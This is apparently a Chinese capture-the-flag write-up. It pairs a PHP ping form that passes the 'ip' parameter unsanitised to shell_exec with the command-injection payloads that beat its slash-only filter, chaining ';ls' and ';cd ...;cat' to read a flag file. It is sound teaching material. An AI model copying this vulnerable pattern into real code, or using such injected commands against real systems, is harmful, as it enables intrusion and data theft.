```php
<html>                                                                                                           
    <body>
        <form action="" method="get">
            <input type="text" name='ip' />
            <input type="submit" name="submit" value="提交">
<?php
$res = FALSE;
if (isset($_GET['submit'])){
    $ip = $_GET['ip'];
    $m = [];
    if (!preg_match_all("/\//", $ip, $m)){
        $cmd = shell_exec( 'ping  -c 4 ' . $ip );
        echo $cmd;
    }
}
?>
        </form>
    </body>
</html>
```
- 这题过滤了目录分隔符
  - payload:
    - 先看看目录下有什么127.0.0.1;ls  发现目录下有一个名为flag_is_here的目录
    - 然后看看flag_is_here目录里面有什么 127.0.0.1;ls flag_is_here
    - 有flag，但是不在当前目录下，所以切换目录就行了 127.0.0.1;cd flag_is_here;cat flag_160862057427113.php